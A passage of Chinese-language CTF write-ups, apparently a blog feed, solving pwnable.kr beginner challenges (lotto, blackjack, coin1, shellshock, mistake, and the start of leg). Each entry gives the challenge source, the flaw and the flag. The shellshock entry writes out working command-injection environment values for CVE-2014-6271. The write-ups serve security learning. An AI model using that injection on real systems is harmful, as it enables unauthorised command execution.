        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— lotto</title>
    <url>/ca309fdf.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy! I made a lotto program for my homework.</span><br><span class="line">do you want to play?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh lotto@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh lotto@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="plotto-c">lotto.c</span><a href="#plotto-c" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Submit your 6 lotto bytes : "</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> r;</span><br><span class="line">	r = <span class="built_in">read</span>(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Lotto Start!\n"</span>);</span><br><span class="line">	<span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// generate lotto numbers</span></span><br><span class="line">	<span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error. tell admin\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">read</span>(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error2. tell admin\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;		<span class="comment">// 1 ~ 45</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">close</span>(fd);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// calculate lotto score</span></span><br><span class="line">	<span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">				match++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// win!</span></span><br><span class="line">	<span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"bad luck...\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"- nLotto Rule -\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"your goal is to match lotto numbers as many as you can\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"if you win lottery for *1st place*, you will get reward\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"for more details, follow the link below\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"mathematical chance to win this game is known to be 1/8145060.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// menu</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"- Select Menu -\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"1. Play Lotto\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"2. Help\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"3. Exit\n"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(menu)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				play();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				help();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"bye\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"invalid menu\n"</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>注意到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(i&#x3D;0; i&lt;6; i++)&#123;</span><br><span class="line">	for(j&#x3D;0; j&lt;6; j++)&#123;</span><br><span class="line">		if(lotto[i] &#x3D;&#x3D; submit[j])&#123;</span><br><span class="line">			match++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>循环中，只要自己输入的submit[j] 6个都相同，那么只要与某个lotto[i]一致，就可以破除，所以看下ascii码在1-45中的某个字符尝试输入几次即可</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>使用’++++++'输入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Submit your 6 lotto bytes : ++++++</span><br><span class="line">Lotto Start!</span><br><span class="line">sorry mom... I FORGOT to check duplicate numbers... :(</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>sorry mom... I FORGOT to check duplicate numbers... :(</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— blackjack</title>
    <url>/1c0d597c.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Hey! check out this C implementation of blackjack game!</span><br><span class="line">I found it online</span><br><span class="line">* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</span><br><span class="line"></span><br><span class="line">I like to give my flags to millionares.</span><br><span class="line">how much money you got?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9009</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int betting() &#x2F;&#x2F;Asks user amount to bet</span><br><span class="line">&#123;</span><br><span class="line"> printf(&quot;\n\nEnter Bet: $&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;, &amp;bet);</span><br><span class="line"> </span><br><span class="line"> if (bet &gt; cash) &#x2F;&#x2F;If player tries to bet more money than player has</span><br><span class="line"> &#123;</span><br><span class="line">        printf(&quot;\nYou cannot bet more money than you have.&quot;);</span><br><span class="line">        printf(&quot;\nEnter Bet: &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;bet);</span><br><span class="line">        return bet;</span><br><span class="line"> &#125;</span><br><span class="line"> else return bet;</span><br><span class="line">&#125; &#x2F;&#x2F; End Function</span><br></pre></td></tr></table></figure><p>可以看到当输入bet后，会与cash比较，数了以后<code>cash=cash-bet</code><br>那么输入一个大的负数，并且输掉应该就可以了</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>输入bet：-100000000，然后选择Stay输掉，再进入下一场即可获得flag</p><p><code>flag</code>：<code>YaY_I_AM_A_MILLIONARE_LOL</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— coin1</title>
    <url>/6060be05.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy, I wanna play a game!</span><br><span class="line">(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9007</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="pgame">game</span><a href="#pgame" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">	-              Shall we play a game?              -</span><br><span class="line">	---------------------------------------------------</span><br><span class="line">	</span><br><span class="line">	You have given some gold coins in your hand</span><br><span class="line">	however, there is one counterfeit coin among them</span><br><span class="line">	counterfeit coin looks exactly same as real coin</span><br><span class="line">	however, its weight is different from real one</span><br><span class="line">	real coin weighs 10, counterfeit coin weighes 9</span><br><span class="line">	help me to find the counterfeit coin with a scale</span><br><span class="line">	if you find 100 counterfeit coins, you will get reward :)</span><br><span class="line">	FYI, you have 60 seconds.</span><br><span class="line">	</span><br><span class="line">	- How to play - </span><br><span class="line">	1. you get a number of coins (N) and number of chances (C)</span><br><span class="line">	2. then you specify a set of index numbers of coins to be weighed</span><br><span class="line">	3. you get the weight information</span><br><span class="line">	4. 2~3 repeats C time, then you give the answer</span><br><span class="line">	</span><br><span class="line">	- Example -</span><br><span class="line">	[Server] N=4 C=2 	# find counterfeit among 4 coins with 2 trial</span><br><span class="line">	[Client] 0 1 		# weigh first and second coin</span><br><span class="line">	[Server] 20			# scale result : 20</span><br><span class="line">	[Client] 3			# weigh fourth coin</span><br><span class="line">	[Server] 10			# scale result : 10</span><br><span class="line">	[Client] 2 			# counterfeit coin is third!</span><br><span class="line">	[Server] Correct!</span><br><span class="line"></span><br><span class="line">	- Ready? starting in 3 sec... -</span><br><span class="line">	</span><br><span class="line">N=441 C=9</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>就是写脚本交互计算一下</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def get_weight(begin,end):</span><br><span class="line">        message &#x3D; &quot;&quot;</span><br><span class="line">        if(begin &#x3D;&#x3D; end):</span><br><span class="line">                ssh.sendline(str(begin))</span><br><span class="line">        else:</span><br><span class="line">                for i in range(begin,end + 1):</span><br><span class="line">                        message &#x3D; message + str(i)+&quot; &quot;</span><br><span class="line">                ssh.sendline(message)</span><br><span class="line">        weight &#x3D; ssh.recvline()</span><br><span class="line">        return int(weight)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_result(N,C):</span><br><span class="line">        begin &#x3D; 0</span><br><span class="line">        end &#x3D; N-1</span><br><span class="line">        for i in range(0,C):</span><br><span class="line">                weight &#x3D; get_weight(begin,int(begin+(end-begin)&#x2F;2))</span><br><span class="line">                if(weight%10!&#x3D;0):</span><br><span class="line">                        end &#x3D; int(begin+(end-begin)&#x2F;2)</span><br><span class="line">                else:</span><br><span class="line">                        begin &#x3D; int(begin+(end-begin)&#x2F;2)+1</span><br><span class="line">        ssh.sendline(str(end))</span><br><span class="line">        result &#x3D; ssh.recvline()</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh &#x3D; remote(&#39;0&#39;,9007)</span><br><span class="line">print(ssh.recv())</span><br><span class="line">for i in range(0,100):</span><br><span class="line">        print(&quot;begin to process the %d th&quot;%i)</span><br><span class="line">        question &#x3D; ssh.recvline()</span><br><span class="line">        N &#x3D; int(question.split(&quot; &quot;)[0].split(&quot;&#x3D;&quot;)[1])</span><br><span class="line">        C &#x3D; int(question.split(&quot; &quot;)[1].split(&quot;&#x3D;&quot;)[1])</span><br><span class="line">        print N,C</span><br><span class="line">        get_result(N,C)</span><br><span class="line">print ssh.recvline()</span><br><span class="line">print ssh.recvline()</span><br></pre></td></tr></table></figure><p>连上去速度略慢，所以可以scp到pwnable.kr服务器再运行脚本<code>scp -P 2222 coin.py fd@pwnable.kr:/tmp</code></p><p><code>flag</code>：<code>b1NaRy_S34rch1nG_1s_3asy_p3asy</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— shellshock</title>
    <url>/7a715b77.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy, there was a shocking news about bash.</span><br><span class="line">I bet you already know, but lets just make it sure :)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh shellshock@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh shellshock@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>题目里说了是利用shellshcok漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@ubuntu:~$ ls -lth</span><br><span class="line">total 960K</span><br><span class="line">-r-xr-sr-x 1 root shellshock_pwn 8.4K Oct 12  2014 shellshock</span><br><span class="line">-r--r--r-- 1 root root            188 Oct 12  2014 shellshock.c</span><br><span class="line">-r--r----- 1 root shellshock_pwn   47 Oct 12  2014 flag</span><br><span class="line">-r-xr-xr-x 1 root shellshock     937K Oct 12  2014 bash</span><br></pre></td></tr></table></figure><p>权限如上，用shellshock的POC看下是否存在漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@ubuntu:~$ env x='() &#123; :;&#125;; echo vulnerable' ./bash -c "echo test"</span><br><span class="line">vulnerable</span><br><span class="line">test</span><br></pre></td></tr></table></figure><p>说明存在</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@ubuntu:~$ env x='() &#123; :;&#125;; bash -c "cat flag"' ./shellshock </span><br><span class="line">only if I knew CVE-2014-6271 ten years ago..!!</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>only if I knew CVE-2014-6271 ten years ago..!!</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— mistake</title>
    <url>/5488b1c2.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">We all make mistakes, let&#39;s move on.</span><br><span class="line">(don&#39;t take this too seriously, no fancy hacking skill is required at all)</span><br><span class="line"></span><br><span class="line">This task is based on real event</span><br><span class="line">Thanks to dhmonkey</span><br><span class="line"></span><br><span class="line">hint : operator priority</span><br><span class="line"></span><br><span class="line">ssh mistake@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh mistake@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pmistake-c">mistake.c</span><a href="#pmistake-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">#define PW_LEN 10</span><br><span class="line">#define XORKEY 1</span><br><span class="line"></span><br><span class="line">void xor(char* s, int len)&#123;</span><br><span class="line">	int i;</span><br><span class="line">	for(i&#x3D;0; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^&#x3D; XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	</span><br><span class="line">	int fd;</span><br><span class="line">	if(fd&#x3D;open(&quot;&#x2F;home&#x2F;mistake&#x2F;password&quot;,O_RDONLY,0400) &lt; 0)&#123;</span><br><span class="line">		printf(&quot;can&#39;t open password %d\n&quot;, fd);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;do not bruteforce...\n&quot;);</span><br><span class="line">	sleep(time(0)%20);</span><br><span class="line"></span><br><span class="line">	char pw_buf[PW_LEN+1];</span><br><span class="line">	int len;</span><br><span class="line">	if(!(len&#x3D;read(fd,pw_buf,PW_LEN) &gt; 0))&#123;</span><br><span class="line">		printf(&quot;read error\n&quot;);</span><br><span class="line">		close(fd);</span><br><span class="line">		return 0;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	char pw_buf2[PW_LEN+1];</span><br><span class="line">	printf(&quot;input password : &quot;);</span><br><span class="line">	scanf(&quot;%10s&quot;, pw_buf2);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; xor your input</span><br><span class="line">	xor(pw_buf2, 10);</span><br><span class="line"></span><br><span class="line">	if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		printf(&quot;Password OK\n&quot;);</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;cat flag\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Wrong Password\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>只是两次输入异或操作然后比较？<br>输入<code>0000000000</code>再输入<code>11111111111</code>即可</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mistake@ubuntu:~$ .&#x2F;mistake </span><br><span class="line">do not bruteforce...</span><br><span class="line">0000000000</span><br><span class="line">input password : 1111111111</span><br><span class="line">Password OK</span><br><span class="line">Mommy, the operator priority always confuses me :(</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>Mommy, the operator priority always confuses me :(</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— leg</title>
    <url>/232eb954.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy told me I should study arm.</span><br><span class="line">But I prefer to study my leg!</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;leg.c</span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;leg.asm</span><br><span class="line"></span><br><span class="line">ssh leg@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh leg@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pleg-c">leg.c</span><a href="#pleg-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">int key1()&#123;</span><br><span class="line">	asm(&quot;mov r3, pc\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot;</span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line">int key3()&#123;</span><br><span class="line">	asm(&quot;mov r3, lr\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int key&#x3D;0;</span><br><span class="line">	printf(&quot;Daddy has very strong arm! : &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;key);</span><br><span class="line">	if( (key1()+key2()+key3()) &#x3D;&#x3D; key )&#123;</span><br><span class="line">		printf(&quot;Congratz!\n&quot;);</span><br><span class="line">		int fd &#x3D; open(&quot;flag&quot;, O_RDONLY);</span><br><span class="line">		char buf[100];</span><br><span class="line">		int r &#x3D; read(fd, buf, 100);</span><br><span class="line">		write(0, buf, r);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;I have strong leg :P\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="pleg-asm">leg.asm</span><a href="#pleg-asm" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008d3c &lt;+0&gt;:	push	&#123;r4, r11, lr&#125;</span><br><span class="line">   0x00008d40 &lt;+4&gt;:	add	r11, sp, #8</span><br><span class="line">   0x00008d44 &lt;+8&gt;:	sub	sp, sp, #12</span><br><span class="line">   0x00008d48 &lt;+12&gt;:	mov	r3, #0</span><br><span class="line">   0x00008d4c &lt;+16&gt;:	str	r3, [r11, #-16]</span><br><span class="line">   0x00008d50 &lt;+20&gt;:	ldr	r0, [pc, #104]	; 0x8dc0 &lt;main+132&gt;</span><br><span class="line">   0x00008d54 &lt;+24&gt;:	bl	0xfb6c &lt;printf&gt;</span><br><span class="line">   0x00008d58 &lt;+28&gt;:	sub	r3, r11, #16</span><br><span class="line">   0x00008d5c &lt;+32&gt;:	ldr	r0, [pc, #96]	; 0x8dc4 &lt;main+136&gt;</span><br><span class="line">   0x00008d60 &lt;+36&gt;:	mov	r1, r3</span><br><span class="line">   0x00008d64 &lt;+40&gt;:	bl	0xfbd8 &lt;__isoc99_scanf&gt;</span><br><span class="line">   0x00008d68 &lt;+44&gt;:	bl	0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:	mov	r4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:	bl	0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:	mov	r3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:	add	r4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:	bl	0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:	mov	r3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:	add	r2, r4, r3</span><br><span class="line">   0x00008d88 &lt;+76&gt;:	ldr	r3, [r11, #-16]</span><br><span class="line">   0x00008d8c &lt;+80&gt;:	cmp	r2, r3</span><br><span class="line">   0x00008d90 &lt;+84&gt;:	bne	0x8da8 &lt;main+108&gt;</span><br><span class="line">   0x00008d94 &lt;+88&gt;:	ldr	r0, [pc, #44]	; 0x8dc8 &lt;main+140&gt;</span><br><span class="line">   0x00008d98 &lt;+92&gt;:	bl	0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008d9c &lt;+96&gt;:	ldr	r0, [pc, #40]	; 0x8dcc &lt;main+144&gt;</span><br><span class="line">   0x00008da0 &lt;+100&gt;:	bl	0xf89c &lt;system&gt;</span><br><span class="line">   0x00008da4 &lt;+104&gt;:	b	0x8db0 &lt;main+116&gt;</span><br><span class="line">   0x00008da8 &lt;+108&gt;:	ldr	r0, [pc, #32]	; 0x8dd0 &lt;main+148&gt;</span><br><span class="line">   0x00008dac &lt;+112&gt;:	bl	0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008db0 &lt;+116&gt;:	mov	r3, #0</span><br><span class="line">   0x00008db4 &lt;+120&gt;:	mov	r0, r3</span><br><span class="line">   0x00008db8 &lt;+124&gt;:	sub	sp, r11, #8</span><br><span class="line">   0x00008dbc &lt;+128&gt;:	pop	&#123;r4, r11, pc&#125;</span><br><span class="line">   0x00008dc0 &lt;+132&gt;:	andeq	r10, r6, r12, lsl #9</span><br><span class="line">   0x00008dc4 &lt;+136&gt;:	andeq	r10, r6, r12, lsr #9</span><br><span class="line">   0x00008dc8 &lt;+140&gt;:			; &lt;UNDEFINED&gt; instruction: 0x0006a4b0</span><br><span class="line">   0x00008dcc &lt;+144&gt;:			; &lt;UNDEFINED&gt; instruction: 0x0006a4bc</span><br><span class="line">   0x00008dd0 &lt;+148&gt;:	andeq	r10, r6, r4, asr #9</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:	mov	r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:	bx	